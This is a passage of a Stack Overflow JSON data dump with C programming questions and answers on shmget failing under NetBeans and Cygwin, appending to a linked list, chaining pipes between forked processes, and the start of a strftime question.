"https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461793940, "post_id": 36901538, "comment_id": 61367247, "body": "Are you using the exact same compiler and compiler arguments in and outside of Netbeans?"}, {"owner": {"reputation": 11, "user_id": 6263755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d0d51fdb45f83bbd92bcc7831b59429?s=128&d=identicon&r=PG&f=1", "display_name": "Anthony Ben", "link": "https://stackoverflow.com/users/6263755/anthony-ben"}, "reply_to_user": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461794905, "post_id": 36901538, "comment_id": 61367681, "body": "Same arguments, but  the compiler at my university must be different since it works when I SSH through putty and connect to their server. I followed the official Net-beans instructions for installing the gcc:<a href=\"https://netbeans.org/community/releases/73/cpp-setup-instructions.html\" rel=\"nofollow noreferrer\">netbeans.org/community/releases/73/cpp-setup-instruction&zwnj;&#8203;s.html</a>"}, {"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461794959, "post_id": 36901538, "comment_id": 61367700, "body": "Do you mean that you&#39;re running Netbeans on a different computer than the one you&#39;re compiling manually on?"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461795691, "post_id": 36901538, "comment_id": 61368007, "body": "You are probably running this under windows, where you need to start the <code>cygserver</code> or similar"}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1461796160, "post_id": 36901538, "comment_id": 61368186, "body": "Windows doesn&#39;t have shared memory and shared semaphores. I don&#39;t know if <code>cygwin</code> or similar products provide emulated shared memory."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1461796732, "post_id": 36901538, "comment_id": 61368407, "body": "@alvits cygserver should emulate that"}, {"owner": {"reputation": 11, "user_id": 6263755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d0d51fdb45f83bbd92bcc7831b59429?s=128&d=identicon&r=PG&f=1", "display_name": "Anthony Ben", "link": "https://stackoverflow.com/users/6263755/anthony-ben"}, "edited": false, "score": 0, "creation_date": 1461800926, "post_id": 36901538, "comment_id": 61369650, "body": "Yes I&#39;m using Netbeans in windows. How would I go about using cygserver in netbeans? Is that possible?!"}, {"owner": {"reputation": 11, "user_id": 6263755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d0d51fdb45f83bbd92bcc7831b59429?s=128&d=identicon&r=PG&f=1", "display_name": "Anthony Ben", "link": "https://stackoverflow.com/users/6263755/anthony-ben"}, "edited": false, "score": 0, "creation_date": 1461839776, "post_id": 36901538, "comment_id": 61386433, "body": "Thank you all for your input!"}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 6263755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d0d51fdb45f83bbd92bcc7831b59429?s=128&d=identicon&r=PG&f=1", "display_name": "Anthony Ben", "link": "https://stackoverflow.com/users/6263755/anthony-ben"}, "is_accepted": false, "score": 0, "last_activity_date": 1461814442, "creation_date": 1461814442, "answer_id": 36904781, "question_id": 36901538, "link": "https://stackoverflow.com/questions/36901538/why-is-function-shmget-key-t-size-t-int-returning-1-in-netbeans-but-it-r/36904781#36904781", "title": "Why is function shmget (key_t , size_t , int ) returning -1 in Netbeans but it runs normally when compiled on the terminal?", "body": "<p>I managed to find a solution to my problem. Here are some steps that can hopefully be easily followed:</p>\n\n<ol>\n<li>Install these 4 packages from Cygwin Setup:</li>\n</ol>\n\n<p>libxcb-shm-devel: X Protoco C-Language Bindings (shm development)</p>\n\n<p>libxcb-shm0: X Protoco C-Language Bindings (shm runtime)</p>\n\n<p>cygrunsrv: NT/W2k service initiator</p>\n\n<p>cygrunsrv-debuginfo: Debug info for cygrunsrv</p>\n\n<ol start=\"2\">\n<li>Run this command in the NetBeans terminal. Simply copy and paste it there:</li>\n</ol>\n\n<p>/usr/bin/cygserver-config</p>\n\n<ol start=\"3\">\n<li>Follow the instructions which ask you to enter yes and it should work.</li>\n</ol>\n"}], "owner": {"reputation": 11, "user_id": 6263755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d0d51fdb45f83bbd92bcc7831b59429?s=128&d=identicon&r=PG&f=1", "display_name": "Anthony Ben", "link": "https://stackoverflow.com/users/6263755/anthony-ben"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 349, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1461814442, "creation_date": 1461793726, "last_edit_date": 1461794172, "question_id": 36901538, "link": "https://stackoverflow.com/questions/36901538/why-is-function-shmget-key-t-size-t-int-returning-1-in-netbeans-but-it-r", "title": "Why is function shmget (key_t , size_t , int ) returning -1 in Netbeans but it runs normally when compiled on the terminal?", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt; /* to allow use of function: atoi() */\n#include \"process.h\"\n#include &lt;string.h&gt;\n\n#include &lt;sys/types.h&gt;\n#include &lt;sys/ipc.h&gt;\n#include &lt;sys/shm.h&gt;\n#include &lt;sys/wait.h&gt; \n#include &lt;errno.h&gt;\n#include &lt;stdint.h&gt;\n\nint  main(int  argc, char *argv[]) \n{\n    size_t size;\n    int ShmID;\n    int *ShmPTR;\n    pid_t pid;\n    int status;\n\n    if (argc != 5) \n    {\n        printf(\"Use: %s #1 #2 #3 #4\\n\", argv[0]);\n        exit(1);\n    }\n\n    ShmID = shmget(IPC_PRIVATE, 4*sizeof(int), IPC_CREAT|0666);\n    if (ShmID &lt; 0)\n    {\n        perror(\"shmget\");\n        printf(\"*** shmget error (server) ***\\n\");\n        printf(\"\\nPrint: %d\",ShmID);\n        printf(\"\\nPrint: %d\",errno);\n        exit(1);\n    }\n    else\n    {\n        printf(\"%s\",\"\\nsuccess\\n\");\n        printf(\"\\n%d\\n\", ShmID);\n\n    }\n\n    return NOERRORS;\n}\n</code></pre>\n\n<p>Output in NetBeans:</p>\n\n<blockquote>\n  <p>shmget: Function not implemented\n  <strong>* shmget error (server) *</strong></p>\n  \n  <p>Print: -1</p>\n  \n  <p>Print: 88</p>\n  \n  <p>RUN FAILED (exit value 1, total time: 94ms)</p>\n</blockquote>\n\n<p>When I compile the code at the terminal through putty, it functions properly and <code>shmget()</code> doesn't return <code>-1</code>. The <code>perror()</code> message in Netbeans says \"function not implemented.\" What is causing this? I just reinstalled the C compiler, Make, GDB, and C++ compiler as well, but no fix.</p>\n"}, {"tags": ["c", "linked-list"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1461793123, "post_id": 36901373, "comment_id": 61366855, "body": "There is a semicolon missing after your struct definition."}, {"owner": {"reputation": 23, "user_id": 5893810, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh3.googleusercontent.com/-tKOfVSdF0QI/AAAAAAAAAAI/AAAAAAAAABg/OuzMiMbVRWU/photo.jpg?sz=128", "display_name": "Kris", "link": "https://stackoverflow.com/users/5893810/kris"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1461793279, "post_id": 36901373, "comment_id": 61366937, "body": "I just forgot to type it in, it&#39;s in the code though. Thanks for the heads up"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 3, "creation_date": 1461793398, "post_id": 36901373, "comment_id": 61367003, "body": "Why are you allocating memory for <code>temp</code>?  That&#39;s a memory leak.  You&#39;re never using the storage that you allocate."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1461793538, "post_id": 36901373, "comment_id": 61367067, "body": "In your caller, you need to update the caller&#39;s list pointer with the list head that this functions returns.  You probably forgot to do so."}, {"owner": {"reputation": 23, "user_id": 5893810, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh3.googleusercontent.com/-tKOfVSdF0QI/AAAAAAAAAAI/AAAAAAAAABg/OuzMiMbVRWU/photo.jpg?sz=128", "display_name": "Kris", "link": "https://stackoverflow.com/users/5893810/kris"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1461793569, "post_id": 36901373, "comment_id": 61367088, "body": "@TomKarzes I thought I needed to allocate memory for temp because I use temp to iterate through the linked list"}, {"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461793667, "post_id": 36901373, "comment_id": 61367127, "body": "Are you actually assigning the return value from <code>addNode</code> to the list head?"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1461793683, "post_id": 36901373, "comment_id": 61367138, "body": "You use <code>temp</code>, yes.  But you do not use what it points to.  Look:  You allocate memory.  You assign it to <code>temp</code>.  Then you assign <code>List</code> to <code>temp</code>.  The memory you allocated is never used, and its address has been lost.  That is a <i>severe</i> bug.  You need to understand this <i>solidly</i> before attempting to use <code>malloc</code>."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1461793762, "post_id": 36901373, "comment_id": 61367174, "body": "Here&#39;s what you need to do:  (1) Fix the memory leak by deleting the call to <code>malloc</code> that is assigned to <code>temp</code>.  (2) Fix the caller to update the caller&#39;s list head with the value this function returns."}, {"owner": {"reputation": 23, "user_id": 5893810, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh3.googleusercontent.com/-tKOfVSdF0QI/AAAAAAAAAAI/AAAAAAAAABg/OuzMiMbVRWU/photo.jpg?sz=128", "display_name": "Kris", "link": "https://stackoverflow.com/users/5893810/kris"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1461794130, "post_id": 36901373, "comment_id": 61367319, "body": "@TomKarzes That worked! I wasn&#39;t fixing the caller&#39;s list head with what the function returned. I feel stupid now for not realizing it lol, thank you for your help! I&#39;m still trying to grasp LInked Lists."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1461801438, "post_id": 36901373, "comment_id": 61369794, "body": "&#39;I just forgot to type it in&#39; - please don&#39;t do that again. Copy/paste in the source you are testing:)"}], "answers": [{"comments": [{"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1461793503, "post_id": 36901439, "comment_id": 61367049, "body": "There&#39;s nothing wrong with this.   The new list head is being returned, which is what matters.  True, there&#39;s no need to assign it to <code>List</code>, but doing so is harmless."}, {"owner": {"reputation": 23, "user_id": 5893810, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh3.googleusercontent.com/-tKOfVSdF0QI/AAAAAAAAAAI/AAAAAAAAABg/OuzMiMbVRWU/photo.jpg?sz=128", "display_name": "Kris", "link": "https://stackoverflow.com/users/5893810/kris"}, "edited": false, "score": 0, "creation_date": 1461793664, "post_id": 36901439, "comment_id": 61367125, "body": "So when I return List, it doesn&#39;t return the newNode that I just set it to?"}, {"owner": {"reputation": 846, "user_id": 3450877, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/VV0PK.png?s=128&g=1", "display_name": "kylemart", "link": "https://stackoverflow.com/users/3450877/kylemart"}, "edited": false, "score": 0, "creation_date": 1461793841, "post_id": 36901439, "comment_id": 61367202, "body": "Fixed based on comment."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "reply_to_user": {"reputation": 23, "user_id": 5893810, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh3.googleusercontent.com/-tKOfVSdF0QI/AAAAAAAAAAI/AAAAAAAAABg/OuzMiMbVRWU/photo.jpg?sz=128", "display_name": "Kris", "link": "https://stackoverflow.com/users/5893810/kris"}, "edited": false, "score": 0, "creation_date": 1461793883, "post_id": 36901439, "comment_id": 61367225, "body": "@Kris It does return it, you just need to update the caller&#39;s copy.  The alternative, which this post shows, is to have the caller pass the address of the list head pointer so that the function can update the caller&#39;s copy. Either method will work.  The change shown here is an slternate way to do it, but is unnecessary.  You can just fix the caller if you like."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1461794410, "post_id": 36901439, "comment_id": 61367456, "body": "The second fragment still leaks *temp."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1461794651, "post_id": 36901439, "comment_id": 61367576, "body": "Also: there is no need for the special case ( <code>if (! *list) {}</code> ) , And the extra parentheses are not needed. (see, for instance: <a href=\"http://stackoverflow.com/a/36824109/905902\">stackoverflow.com/a/36824109/905902</a>)"}, {"owner": {"reputation": 846, "user_id": 3450877, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/VV0PK.png?s=128&g=1", "display_name": "kylemart", "link": "https://stackoverflow.com/users/3450877/kylemart"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1461795449, "post_id": 36901439, "comment_id": 61367914, "body": "@wildplasser I&#39;ve refactored the code. However, I feel as though this might be more confusing for the beginners."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1461796417, "post_id": 36901439, "comment_id": 61368288, "body": "You don&#39;t need the extra parentheses. <code>=</code> has the lowest precedence (except for <code>,</code> ) --&gt;&gt; <code>List = &amp;(*List)-&gt;next;</code> And the convention is (more or less) to use Initcaps for typenames"}, {"owner": {"reputation": 846, "user_id": 3450877, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/VV0PK.png?s=128&g=1", "display_name": "kylemart", "link": "https://stackoverflow.com/users/3450877/kylemart"}, "edited": false, "score": 0, "creation_date": 1461797246, "post_id": 36901439, "comment_id": 61368607, "body": "I&#39;m aware of the convention. I was keeping consistent with the naming-style used by the OP. As for the parenthesis in <code>List = &amp;(*List)-&gt;next;</code>, they cannot be removed. This is for the <b>exact</b> reason you specified: precedence. <code>List = &amp;*List-&gt;next;</code> will not compile, nor would <code>List = &amp;(*List-&gt;next);</code>."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1461800874, "post_id": 36901439, "comment_id": 61369632, "body": "Note: you had an extra set of parentheses, a few edits ago."}], "tags": [], "owner": {"reputation": 846, "user_id": 3450877, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/VV0PK.png?s=128&g=1", "display_name": "kylemart", "link": "https://stackoverflow.com/users/3450877/kylemart"}, "is_accepted": true, "score": 2, "last_activity_date": 1461797855, "last_edit_date": 1495535288, "creation_date": 1461793322, "answer_id": 36901439, "question_id": 36901373, "link": "https://stackoverflow.com/questions/36901373/linked-list-insertion-at-the-end/36901439#36901439", "title": "Linked List insertion at the end", "body": "<p>You may be calling your function incorrectly, as others have noted.</p>\n\n<pre><code>struct node *numbers = NULL;\nnumbers = addNode(numbers, 5);\n</code></pre>\n\n<p>Alternatively, you could re-write your function to utilize double pointers. This would remove the need of having to re-assign your list pointer to the result of your <code>addNode()</code> function each time. It also shortens the function's implementation.</p>\n\n<pre><code>void addNode(struct node **list, int n) {\n\n    struct node *newNode = malloc(sizeof(struct node));\n    newNode-&gt;data = n;\n    newNode-&gt;next= NULL;\n\n    while (*list){\n        list = &amp;(*list)-&gt;next;\n    }\n\n    *list = newNode;\n}\n</code></pre>\n\n<p>This can be called like so:</p>\n\n<pre><code>struct node *numbers = NULL;\naddNode(&amp;numbers, 4);\n</code></pre>\n\n<hr>\n\n<p><em>References:</em></p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/1722112/what-are-the-most-common-naming-conventions-in-c\">What are the most common naming conventions in C?</a></li>\n<li><a href=\"https://www.eskimo.com/~scs/cclass/int/sx8.html\" rel=\"nofollow noreferrer\">Pointers of Pointers</a></li>\n</ul>\n"}], "owner": {"reputation": 23, "user_id": 5893810, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh3.googleusercontent.com/-tKOfVSdF0QI/AAAAAAAAAAI/AAAAAAAAABg/OuzMiMbVRWU/photo.jpg?sz=128", "display_name": "Kris", "link": "https://stackoverflow.com/users/5893810/kris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "accepted_answer_id": 36901439, "answer_count": 1, "score": -1, "last_activity_date": 1461797855, "creation_date": 1461793013, "last_edit_date": 1461793289, "question_id": 36901373, "link": "https://stackoverflow.com/questions/36901373/linked-list-insertion-at-the-end", "title": "Linked List insertion at the end", "body": "<p>I'm trying to insert a node at the end of the linked list but for some reason my print function tells me that the list is empty.</p>\n\n<p>Struct: </p>\n\n<pre><code>struct node{\n       int data;\n       struct nodeList *next;\n };\n</code></pre>\n\n<p>Here is my addNode function</p>\n\n<pre><code>    struct node* addNode(struct node* List, int n){\n\n    struct node* newNode = (struct node*)malloc(sizeof(struct node));\n    struct node* temp = (struct node*)malloc(sizeof(struct node));\n\n\n    newNode-&gt;data = n;\n    newNode-&gt;next= NULL;\n\n    if(List == NULL){\n        List = newNode;\n        return List;\n    }\n\n    temp = List;\n\n    while(temp-&gt;next != NULL){\n        temp = temp-&gt;next;\n     }\n\n    temp-&gt;next = newNode;\n    return List;\n\n    }\n</code></pre>\n\n<p>I appreciate any help!</p>\n"}, {"tags": ["c", "linux", "pipe", "ipc", "pipeline"], "comments": [{"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461792146, "post_id": 36901055, "comment_id": 61366402, "body": "&quot;<i>maybe because in first child stdout fd is not closed</i>&quot; -- It seems like you&#39;ve already identified the problem. Since the first filter never sees EOF on its input pipe (since it&#39;s being held open by another process), it will never finish."}, {"owner": {"reputation": 974, "user_id": 4229825, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/dMNcM.jpg?s=128&g=1", "display_name": "0x1337", "link": "https://stackoverflow.com/users/4229825/0x1337"}, "reply_to_user": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461792391, "post_id": 36901055, "comment_id": 61366524, "body": "@Dolda2000 Yes, but how can I close stdout fd in outer process?"}, {"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461792442, "post_id": 36901055, "comment_id": 61366552, "body": "You have already closed it in the parent-most process; the problem rather appears to be that you don&#39;t close it in your <code>reverse</code> child."}, {"owner": {"reputation": 974, "user_id": 4229825, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/dMNcM.jpg?s=128&g=1", "display_name": "0x1337", "link": "https://stackoverflow.com/users/4229825/0x1337"}, "reply_to_user": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461792945, "post_id": 36901055, "comment_id": 61366775, "body": "@Dolda2000 &quot;How can I close stdout fd in outer process?&quot;. I understand that fd is not closed. I don&#39;t understand how to close it before <code>exec</code>."}, {"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461792984, "post_id": 36901055, "comment_id": 61366795, "body": "How can you not understand that when you&#39;re already closing all the other pipes properly?"}], "answers": [{"tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": true, "score": 1, "last_activity_date": 1461838280, "creation_date": 1461838280, "answer_id": 36911514, "question_id": 36901055, "link": "https://stackoverflow.com/questions/36901055/multi-pipe-does-not-work/36911514#36911514", "title": "Multi-pipe does not work", "body": "<p>You are closing the pipes too early. Typically, you close <code>fd2[0]</code> before you use it in <code>dup2</code>. And as you redirect FILENO_STDOUT before the second fork, the second filter has no longer access to the original stdout.</p>\n\n<p>Following code works:</p>\n\n<pre><code>int main() {\n    int fd1[2];\n    pipe(fd1);\n    pid_t pid1;\n\n    if ((pid1 = fork()) &gt; 0) {\n        char data[] = \"Hello world!\";\n\n        close(fd1[0]); // OK, will no longer be used\n        write(fd1[1], data, sizeof(data));\n        close(fd1[1]);\n        wait(NULL);\n        exit(EXIT_SUCCESS);\n\n    } else if (pid1 == 0) {\n        int fd2[2];\n        pipe(fd2);\n        pid_t pid2;\n        close(fd1[1]); // OK, no used from here\n\n        if ((pid2 = fork()) &gt; 0) {\n        dup2(fd1[0], STDIN_FILENO);  // redirections for filter1\n        dup2(fd2[1], STDOUT_FILENO);\n        close(fd1[0]);               // close everything except stdin and stdout\n        close(fd2[0]); close(fd2[1]);\n            execl(\"./upcase\", \"upcase\", NULL);\n            perror(\"execl upcase\");\n            exit(EXIT_FAILURE);\n        } else if (pid2 == 0) {\n            close(fd1[0]);             // not used here\n\n            dup2(fd2[0], STDIN_FILENO); // redirection for filter2\n            close(fd2[0]); close(fd2[1]); // close all what remains\n\n            execl(\"./reverse\", \"reverse\", NULL);\n            perror(\"execl reverse\");\n            exit(EXIT_FAILURE);\n        } else {\n            ...\n</code></pre>\n"}], "owner": {"reputation": 974, "user_id": 4229825, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/dMNcM.jpg?s=128&g=1", "display_name": "0x1337", "link": "https://stackoverflow.com/users/4229825/0x1337"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 178, "favorite_count": 0, "accepted_answer_id": 36911514, "answer_count": 1, "score": 1, "last_activity_date": 1461838280, "creation_date": 1461791809, "last_edit_date": 1461834688, "question_id": 36901055, "link": "https://stackoverflow.com/questions/36901055/multi-pipe-does-not-work", "title": "Multi-pipe does not work", "body": "<p>I need to implement such IPC-schema:</p>\n\n<p><code>runtime data -&gt; filter1 -&gt; filter2 -&gt; output</code>. (same as <code>data | filter1 | filter2</code>). </p>\n\n<p>I can pass data to first filter, but to second I can not (maybe because in first child stdout fd is not closed). How to properly implement such schema? </p>\n\n<p>P.S. filter1 and filter2 just read from stdin and write to stdout.</p>\n\n<p>My code:</p>\n\n<pre><code>int main() {\n    int fd1[2];\n    pipe(fd1);\n    pid_t pid1;\n\n    if ((pid1 = fork()) &gt; 0) {\n        char data[] = \"Hello world!\";\n\n        close(fd1[0]);\n        write(fd1[1], data, sizeof(data));\n        close(fd1[1]);\n        wait(NULL);\n        exit(EXIT_SUCCESS);\n\n    } else if (pid1 == 0) {\n        int fd2[2];\n        pipe(fd2);\n        pid_t pid2;\n\n        dup2(fd1[0], STDIN_FILENO);\n        dup2(fd2[1], STDOUT_FILENO);\n        close(fd1[0]); close(fd1[1]);\n        close(fd2[0]); close(fd2[1]);\n\n        if ((pid2 = fork()) &gt; 0) {\n            execl(\"./upcase\", \"upcase\", NULL);\n            perror(\"execl\");\n            exit(EXIT_FAILURE);\n        } else if (pid2 == 0) {\n            close(fd1[0]); close(fd1[1]);\n\n            dup2(fd2[0], STDIN_FILENO);\n            close(fd2[0]); close(fd2[1]);\n\n            execl(\"./reverse\", \"reverse\", NULL);\n            perror(\"execl\");\n            exit(EXIT_FAILURE);\n        } else {\n            perror(\"pid2\");\n            exit(EXIT_FAILURE);\n        }\n\n    } else {\n        perror(\"pid1\");\n        exit(EXIT_FAILURE);\n    }\n\n}\n</code></pre>\n"}, {"tags": ["python", "c", "strftime"], "comments": [{"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 1, "creation_date": 1461792354, "post_id": 36901047, "comment_id": 61366502, "body": "There appears to be no such option, quite simply."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 4, "creation_date": 1461793084, 